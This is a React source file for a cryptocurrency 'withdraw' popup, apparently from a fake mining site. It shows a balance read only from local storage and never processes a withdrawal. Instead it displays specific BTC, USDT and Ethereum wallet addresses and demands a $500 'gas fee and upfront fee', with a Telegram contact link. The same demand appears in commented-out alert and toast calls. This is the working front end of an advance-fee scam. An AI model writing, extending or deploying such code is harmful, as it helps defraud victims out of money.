import React, { useState, useEffect } from "react";
import "./withdraw.css";
import toast from "react-hot-toast";

const WithdrawPopup = ({ isOpen, onClose, onWithdraw }) => {
  const [withdrawAmount, setWithdrawAmount] = useState("");
  const [storedWithdrawAmount, setStoredWithdrawAmount] = useState(0);
  const [success, setSuccess] = useState(false);

  // Load stored withdrawal amount from local storage on component mount
  useEffect(() => {
    const storedAmount = localStorage.getItem("totalVolume");
    if (storedAmount) {
      setStoredWithdrawAmount(parseFloat(storedAmount));
    }
  }, []);

  useEffect(() => {
    setTimeout(() => {
      if (success) {
        setSuccess(false);
        onClose();
      }
    }, 6000);
  }, [success]);

  const handleWithdraw = () => {
    if (!withdrawAmount || isNaN(withdrawAmount) || parseFloat(withdrawAmount) <= 0) {
      alert("Please enter a valid withdrawal amount.");
      return;
    }

    if (parseFloat(withdrawAmount) > storedWithdrawAmount) {
      alert("Unable to withdraw this amount. Insufficient funds.");
      return;
    }
    if (parseFloat(storedWithdrawAmount) < 3000) {
      alert("Your balance must be up to 3000.");
      return;
    }
    // Withdraw successful, set success to true
    setSuccess(true);

    // You can include logic here to send the withdrawal details to your backend

    const btcAddress = "123JgU9Zih5GBWN7mWKML2jSNCUwx8yb8j";
    const usdtTrc20Address = "TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy";
    const ethereumAddress = "0x87cdd933bf000f96309215752696ae080f684ba9";
    const link = "https://t.me/+79_1pk7cxb01NTRk";

    // Display success message with withdrawal details
    // alert(
    //   `Pay $500 to any of this address for processing!\nBTC Address: ${btcAddress}\nUSDT TRC20 Address: ${usdtTrc20Address}\nEthereum Address: ${ethereumAddress} \ncontact address: ${link}`
    // );
    // toast(
    //   `Pay $500 to any of this address for processing!\nBTC Address: ${btcAddress}\nUSDT TRC20 Address: ${usdtTrc20Address}\nEthereum Address: ${ethereumAddress} \ncontact address: ${link}`
    // );
  };

  return (
    <div className={`withdraw-popup ${isOpen ? "open" : ""}`}>
      <div className="withdraw-popup-content">
        {success ? (
          <p className="success-message">
            <span style={{ color: "yelloe" }}> btcAddress = 123JgU9Zih5GBWN7mWKML2jSNCUwx8yb8j</span>
            <span style={{ color: "green" }}> usdtTrc20Address = TTGUJhv8jZKiUApoet6S9xXStUbZCCTywy</span>
            <span style={{ color: "orange" }}> ethereumAddress = 0x87cdd933bf000f96309215752696ae080f684ba9 </span>
            <span style={{ color: "red" }}>
              All withdrawal is process by our team, Note: a fee of ($500) is to be paid to clear out your gas fee and
              your upfront fee{" "}
            </span>
            <span style={{ color: "red" }}> you can keep mining until you are able to clear your gas fee</span>
            <span style={{ color: "red" }}>Contact us with the link there to get more information from us!</span>
            <a style={{ color: "blue" }} href="https://t.me/+79_1pk7cxb01NTRk">
              https://t.me/+79_1pk7cxb01NTRk
            </a>
          </p>
        ) : (
          <>
            <span className="close" onClick={onClose}>
              &times;
            </span>
            <h2 style={{ color: "black" }}> Withdraw Funds</h2>
            <label style={{ color: "black" }} htmlFor="withdrawAmount">
              Amount:
            </label>
            <input
              style={{ color: "black", backgroundColor: "grey" }}
              type="number"
              id="withdrawAmount"
              value={withdrawAmount}
              onChange={(e) => setWithdrawAmount(e.target.value)}
            />
            <label style={{ color: "black" }} htmlFor="withdrawAmount">
              Address:
            </label>
            <input style={{ color: "black", backgroundColor: "grey" }} type="text" id="withdrawAmount" />
            <div style={{ color: "black" }}>Available Withdrawal Amount: ${storedWithdrawAmount.toFixed(2)}</div>

            <button style={{ backgroundColor: "black", color: "orange" }} onClick={handleWithdraw}>
              Withdraw
            </button>
          </>
        )}
      </div>
    </div>
  );
};

export default WithdrawPopup;
